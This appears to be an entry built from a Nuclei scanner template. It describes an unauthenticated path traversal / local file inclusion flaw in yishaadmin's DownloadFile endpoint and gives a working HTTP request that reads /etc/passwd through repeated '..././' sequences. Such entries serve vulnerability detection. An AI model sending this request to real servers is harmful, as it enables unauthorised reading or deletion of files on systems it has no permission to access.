# Vulnerability: yishaadmin - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`yishaadmin-lfi.yaml`)

## Description
yishaadmin is vulnerable to local file inclusion via the "/admin/File/DownloadFile" endpoint and allows files to be downloaded, read or deleted without any authentication.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /admin/File/DownloadFile?filePath=wwwroot/..././/..././/..././/..././/..././/..././/..././/..././etc/passwd&delete=0 HTTP/1.1
Host: {{Hostname}}
```

